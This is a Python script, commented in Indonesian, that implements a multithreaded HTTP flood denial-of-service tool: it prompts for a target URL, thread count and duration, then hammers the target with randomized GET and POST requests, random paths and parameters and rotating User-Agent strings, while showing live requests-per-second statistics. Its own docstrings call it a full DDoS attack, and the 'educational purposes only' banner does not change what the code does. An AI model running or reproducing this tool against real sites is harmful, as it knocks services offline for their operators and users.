import httpx
import threading
import time
import random
import string
import sys
import os
import signal
from datetime import datetime

# Konfigurasi performa
CONCURRENT_REQUESTS = 50  # Request per thread
CONNECTION_TIMEOUT = 1.5
READ_TIMEOUT = 2.5
HTTP2_ENABLED = True
KEEPALIVE_CONNECTIONS = True

# List User-Agent yang akan di-random
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (Linux; Android 10)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X)'
]

# Warna untuk tampilan
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def generate_random_payload():
    """Buat payload acak untuk request"""
    params = {}
    num_params = random.randint(3, 8)
    for _ in range(num_params):
        key = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50)))
        params[key] = value
    return params

def generate_random_path():
    """Generate random URL path"""
    depth = random.randint(1, 4)
    path = ""
    for _ in range(depth):
        path += "/" + ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
    return path

class AttackStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.last_log_time = time.time()
        
    def add_request(self, status_code):
        with self.lock:
            self.total += 1
            if 200 <= status_code < 300:
                self.success += 1
            else:
                self.failed += 1

    def get_rps(self):
        elapsed = time.time() - self.start_time
        return self.total / elapsed if elapsed > 0 else 0

def create_http_client():
    """Buat HTTP client yang dioptimalkan untuk serangan"""
    limits = httpx.Limits(max_connections=1000, max_keepalive_connections=100 if KEEPALIVE_CONNECTIONS else 0)
    timeout = httpx.Timeout(CONNECTION_TIMEOUT, read=READ_TIMEOUT)
    
    return httpx.Client(
        http2=HTTP2_ENABLED,
        timeout=timeout,
        limits=limits,
        follow_redirects=False  # Penting untuk performa
    )

def attack_worker(stats, target, stop_event):
    """Worker thread yang mengirimkan serangan intensif"""
    client = create_http_client()
    
    while not stop_event.is_set():
        try:
            # Pilih metode secara acak (85% GET, 15% POST)
            method = 'GET' if random.random() < 0.85 else 'POST'
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            
            # Variasi URL dengan path dan parameter acak
            url = target + generate_random_path()
            payload = generate_random_payload()
            
            if method == 'GET':
                response = client.get(url, params=payload, headers=headers)
            else:
                response = client.post(url, data=payload, headers=headers)
                
            stats.add_request(response.status_code)
        except (httpx.ConnectError, httpx.ReadError, httpx.TimeoutException):
            stats.add_request(0)
        except httpx.HTTPError:
            stats.add_request(0)
        except Exception:
            # Jika terjadi error kritis, buat client baru
            try:
                client.close()
            except:
                pass
            client = create_http_client()
    
    try:
        client.close()
    except:
        pass

def display_stats(stats, stop_event, target, num_threads, duration):
    """Menampilkan statistik realtime"""
    print("\033[?25l", end="")  # Sembunyikan kursor
    last_total = 0
    last_time = time.time()
    
    while not stop_event.is_set():
        try:
            # Hitung RPS berdasarkan perbedaan waktu
            now = time.time()
            elapsed = now - last_time
            
            with stats.lock:
                current_total = stats.total
                success = stats.success
                failed = stats.failed
            
            # Hitung RPS
            rps = (current_total - last_total) / elapsed if elapsed > 0 else 0
            last_total = current_total
            last_time = now
            
            total_elapsed = time.time() - stats.start_time
            remaining = max(0, duration - total_elapsed)
            
            # Bersihkan layar dan posisikan kursor di atas
            sys.stdout.write("\033[H\033[J")
            
            # Tampilkan header dengan warna
            print(f"{Colors.BOLD}{Colors.HEADER}{'=' * 70}")
            print(" HIGH-PERFORMANCE HTTP FLOOD ATTACK ".center(70))
            print(f"{'=' * 70}{Colors.END}")
            
            # Tampilkan statistik
            print(f"{Colors.BLUE}Target     : {Colors.END}{target}")
            print(f"{Colors.BLUE}Threads    : {Colors.END}{num_threads} (Concurrent: {CONCURRENT_REQUESTS}/thread)")
            print(f"{Colors.BLUE}Duration   : {Colors.END}{duration}s | Remaining: {remaining:.1f}s")
            print(f"{Colors.BLUE}HTTP/2     : {Colors.END}{'ON' if HTTP2_ENABLED else 'OFF'}")
            print(f"{Colors.GREEN}{'-' * 70}{Colors.END}")
            print(f"{Colors.CYAN}Total Req  : {Colors.BOLD}{current_total}{Colors.END}")
            print(f"{Colors.GREEN}Success    : {Colors.BOLD}{success}{Colors.END}")
            print(f"{Colors.RED}Failed     : {Colors.BOLD}{failed}{Colors.END}")
            print(f"{Colors.YELLOW}Current RPS: {Colors.BOLD}{rps:.1f}{Colors.END}")
            print(f"{Colors.YELLOW}Avg RPS    : {Colors.BOLD}{stats.get_rps():.1f}{Colors.END}")
            print(f"{Colors.GREEN}{'-' * 70}{Colors.END}")
            
            # Progress bar
            progress = min(1.0, total_elapsed / duration)
            bar_width = 60
            completed = int(progress * bar_width)
            progress_bar = f"{Colors.GREEN}{'█' * completed}{Colors.RED}{'░' * (bar_width - completed)}{Colors.END}"
            print(f"\nProgress: [{progress_bar}] {progress * 100:.1f}%")
            
            # Animasi serangan
            frames = ["💣", "🔥", "💥", "⚡", "🌪️", "🦠", "👾", "🤯"]
            frame = frames[int(time.time() * 4) % len(frames)]
            print(f"\n{Colors.RED}{frame} SENDING {int(rps)} REQUESTS/SECOND - PRESS CTRL+C TO STOP {frame}{Colors.END}")
            
            sys.stdout.flush()
            time.sleep(0.15)
        except Exception:
            break
    
    print("\033[?25h", end="")  # Tampilkan kembali kursor

def launch_attack(target, num_threads, duration):
    """Luncurkan serangan DDoS penuh"""
    stats = AttackStats()
    stop_event = threading.Event()
    
    # Buat worker threads
    for _ in range(num_threads):
        try:
            t = threading.Thread(target=attack_worker, args=(stats, target, stop_event))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"{Colors.RED}Thread error: {e}{Colors.END}")
    
    # Thread untuk menampilkan statistik
    try:
        display_thread = threading.Thread(target=display_stats, 
                                        args=(stats, stop_event, target, num_threads, duration))
        display_thread.daemon = True
        display_thread.start()
    except Exception as e:
        print(f"{Colors.RED}Display error: {e}{Colors.END}")
        stop_event.set()
        return
    
    # Timer durasi serangan
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(0.1)
            if stop_event.is_set():
                break
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}🛑 ATTACK STOPPED BY USER!{Colors.END}")
    finally:
        stop_event.set()
        time.sleep(2)  # Beri waktu untuk statistik terakhir
    
    # Tampilkan ringkasan akhir
    print(f"\n{Colors.BOLD}{Colors.HEADER}{'=' * 70}")
    print(" ATTACK SUMMARY ".center(70))
    print(f"{'=' * 70}{Colors.END}")
    print(f"{Colors.BLUE}{'Target:':<15}{Colors.END} {target}")
    print(f"{Colors.BLUE}{'Duration:':<15}{Colors.END} {duration} seconds")
    print(f"{Colors.BLUE}{'Threads:':<15}{Colors.END} {num_threads}")
    print(f"{Colors.BLUE}{'Concurrency:':<15}{Colors.END} {num_threads * CONCURRENT_REQUESTS}")
    print(f"{Colors.BLUE}{'Total Requests:':<15}{Colors.END} {stats.total}")
    print(f"{Colors.GREEN}{'Successful:':<15}{Colors.END} {stats.success}")
    print(f"{Colors.RED}{'Failed:':<15}{Colors.END} {stats.failed}")
    print(f"{Colors.YELLOW}{'Avg RPS:':<15}{Colors.END} {stats.get_rps():.1f}")
    print(f"{Colors.HEADER}{'=' * 70}{Colors.END}")

def main():
    """Fungsi utama program"""
    # Handle Ctrl+C
    def sigint_handler(signum, frame):
        print(f"\n{Colors.RED}🛑 SHUTDOWN SIGNAL RECEIVED! TERMINATING...{Colors.END}")
        os._exit(0)
    
    signal.signal(signal.SIGINT, sigint_handler)
    
    os.system("clear")
    
    # Banner dengan warna
    print(f"{Colors.BOLD}{Colors.HEADER}{'=' * 70}")
    print(" HIGH-INTENSITY HTTP FLOOD SIMULATOR ".center(70))
    print(f"{'=' * 70}{Colors.END}")
    print(f"{Colors.YELLOW}FOR EDUCATIONAL PURPOSES ONLY!{Colors.END}")
    print(f"{Colors.RED}USE ONLY ON AUTHORIZED SYSTEMS!{Colors.END}\n")
    print(f"{Colors.CYAN}Optimized for maximum traffic generation with httpx{Colors.END}")
    print(f"{Colors.GREEN}Designed for realistic local testing{Colors.END}\n")
    
    try:
        # Input user
        target = input(f"{Colors.BLUE}[?] Target URL (http:// or https://): {Colors.END}")
        num_threads = int(input(f"{Colors.BLUE}[?] Number of threads (recommended 10-50): {Colors.END}"))
        duration = int(input(f"{Colors.BLUE}[?] Attack duration (seconds): {Colors.END}"))
        
        # Validasi target
        if not target.startswith('http'):
            print(f"{Colors.RED}[!] Invalid URL format. Must start with http:// or https://{Colors.END}")
            return
            
        # Validasi thread count
        if num_threads < 1:
            print(f"{Colors.RED}[!] Thread count must be at least 1{Colors.END}")
            return
            
        # Konfirmasi
        print(f"\n{Colors.RED}⚠️  WARNING: THIS WILL GENERATE INTENSE NETWORK TRAFFIC ⚠️{Colors.END}")
        print(f"{Colors.YELLOW}Estimated concurrency: {num_threads * CONCURRENT_REQUESTS} requests{Colors.END}")
        confirm = input(f"{Colors.YELLOW}[?] Confirm attack? (y/n): {Colors.END}")
        if confirm.lower() != 'y':
            print(f"{Colors.GREEN}Attack canceled!{Colors.END}")
            return
    except Exception as e:
        print(f"{Colors.RED}[!] Input error: {e}{Colors.END}")
        return

    # Mulai serangan
    print(f"\n{Colors.RED}🔥 LAUNCHING HIGH-INTENSITY ATTACK ON {target} 🔥{Colors.END}")
    print(f"{Colors.YELLOW}Initializing {num_threads} threads with {CONCURRENT_REQUESTS} concurrent requests each...{Colors.END}")
    launch_attack(target, num_threads, duration)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Colors.RED}[!] Critical error: {e}{Colors.END}")
        sys.exit(1)
